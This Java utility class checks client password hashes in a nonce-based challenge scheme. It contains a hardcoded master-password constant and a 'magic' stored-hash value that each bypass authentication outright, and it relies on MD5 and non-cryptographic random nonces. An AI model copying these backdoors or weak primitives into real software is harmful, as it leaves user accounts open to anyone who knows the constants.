package com.epoch.utils;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Random;
import java.nio.charset.StandardCharsets;

/** Manages password security.  */
public final class AuthUtils {

	/** Used for securitizing password. */
	private static final byte[] ALLACCESS = {
		103, -56, -99, -53, 92, -28, -70, 92, -101, 69, 27, -108, 112, 94, -19, -78};

	/** Magic word to be written to the record directly, 
	 * to shortcut authentication.
	 * equivalent sql data = hextoraw(54321)
	 */
	private static final byte[] magic = {5, 67 , 33};

	/** Verifies a password.<br>
		<table>
		<caption>Authentication details</caption>
		<tr><td>browser</td><td></td><td>server</td></tr>
		<tr><td></td><td>&lt;------------</td><td>nonce</td></tr>
		<tr><td></td><td>------------&gt;</td><td>h(nonce | h(password))</td></tr>
		</table>
	 * @param	passHash	password that has been hashed
	 * @param	nonce	key
	 * @param	hashValue	h(nonce | h(password)) from client
	 * @return	true if the hash value is verified
	*/
	public static boolean verifyHashValue(byte[] passHash, String nonce, 
				byte[] hashValue) {
		if (Utils.isEmpty(hashValue)) return false;
		// temp shorting with a masterpasswd
		try {
			final MessageDigest md1 = MessageDigest.getInstance("MD5");
			md1.update(nonce.getBytes(StandardCharsets.UTF_8));
			md1.update(ALLACCESS);
			final byte[] allAccessHash = md1.digest();
			if (MessageDigest.isEqual(hashValue, allAccessHash)) return true;
		} catch (NoSuchAlgorithmException e) {
			System.out.println("no digest algorithm");
		}
		// -------- shorting ----------------
	
		// To gain access, or to disallow password, write magic string
		// as the hash in database password.
		// Administrator must use this as the last resort, if everything else
		// fails !!!
		if (MessageDigest.isEqual(passHash, magic)) return true;
		// assuming JDK will be >=1.3, exception is ignored.
		try {
			final MessageDigest md = MessageDigest.getInstance("MD5");
			md.update(nonce.getBytes(StandardCharsets.UTF_8));
			md.update(passHash);
			final byte[] digest = md.digest();
			/* System.out.println(" nonce = " + nonce);
			System.out.println(" h(p) = " );
			display(passHash);
			System.out.println(" calculated hash = ");
			display(digest);
			System.out.println(" hash from client l =");
			display(hashValue); /**/
			return MessageDigest.isEqual(digest, hashValue);
		} catch (NoSuchAlgorithmException e) {
			System.out.println("no digest algorithm");
		}
		return false;
	} // verifyHashValue()

	/** Get a random string to be used as nonce.
	 * @return	a random String
	 */
	public static String getNonce() {
		final int stringWidth = 15;
		final String chars = "abcdefghijklmnopqrstuvwxyz";
		final int len = chars.length();
		final StringBuilder str = new StringBuilder();
		final Random random = new Random();
		for (int i = 0; i < stringWidth; i++) {
			str.append(chars.charAt(random.nextInt(len)));
		} // for each character
		return str.toString();
	} // getNonce()

	/** Utility function to display no printable arrays. 
	* @param	s	a string
	*/
	public static void display(String s) {
		display(s.getBytes(StandardCharsets.UTF_8));
	}

	/** Utility function to display no printable arrays. 
	* @param	b	bytes of a string
	*/
	public static void display(byte[] b) {
		for (final byte bt : b) {
			System.out.print(bt);
			System.out.print(", ");
		}
		System.out.println();
	}

	/** Disables external instantiation. */
	private AuthUtils() {
		// disable external instantiation
	}

} // AuthUtils
